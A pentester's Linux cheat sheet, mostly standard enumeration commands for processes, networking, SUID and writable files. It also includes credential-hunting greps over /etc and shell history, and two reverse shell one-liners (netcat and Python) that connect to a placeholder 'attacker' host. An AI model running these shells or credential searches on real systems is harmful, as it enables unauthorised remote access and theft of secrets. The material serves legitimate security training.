# Linux Fundamentals for Pentesters

Core commands every pentester should know cold. Focus on enumeration and living off the land.

## Essential Commands

| Command | Description |
|---------|-------------|
| `man <cmd>` / `<cmd> --help` / `<cmd> -h` | Help |
| `apropos keyword` | Search man pages |
| `id; whoami; hostname; uname -a` | Identity & system |
| `pwd; ls -la; cd; tree` | Navigation |
| `cat /etc/os-release; cat /etc/issue` | Distro info |
| `ps auxf; pstree; top / htop` | Processes |
| `netstat -tuln; ss -tuln; ip a; ip r` | Networking |
| `find / -type f -perm -4000 2>/dev/null` | SUID files |
| `grep -r 'password' /etc/ 2>/dev/null` | Quick credential search |

## Useful One-liners

```bash
# Find world-writable
find / -writable -type d 2>/dev/null

# History
history | tail -50

# Listening as non-root often reveals services
ss -tulnp | grep -v "127.0.0"

# Recent files
find / -mtime -7 -type f 2>/dev/null | head
```

## File Transfer & Text Processing

`curl`, `wget`, `scp`, `rsync`, `base64`, `xxd`, `tr`, `sed`, `awk`, `jq`, `grep -r`.

## 2026 Tips

- Use `ip` over deprecated `ifconfig`.
- `systemctl`, `journalctl` for service inspection.
- Containers: `docker ps`, `ctr`, `crictl`, `ls /var/lib/docker`.
- For automation, combine with `jq` + APIs.

## More Useful Commands & One-Liners

```bash
# Process & user enumeration
ps aux --sort=-%cpu | head
last -a | head
w; who -a

# Network deep dive
ip -br a; ss -tulnpe; netstat -tulnpe
lsof -i -P -n | grep LISTEN

# File & permission hunting
find / -type f -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -20
find / -writable -type f 2>/dev/null | grep -v proc

# Log & history
cat ~/.bash_history | grep -E 'pass|key|secret'
journalctl -u ssh --since "1 hour ago"

# Quick reverse shell alternatives (fundamentals)
nc -e /bin/sh attacker 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

See also the dedicated Linux Privilege Escalation sheet.
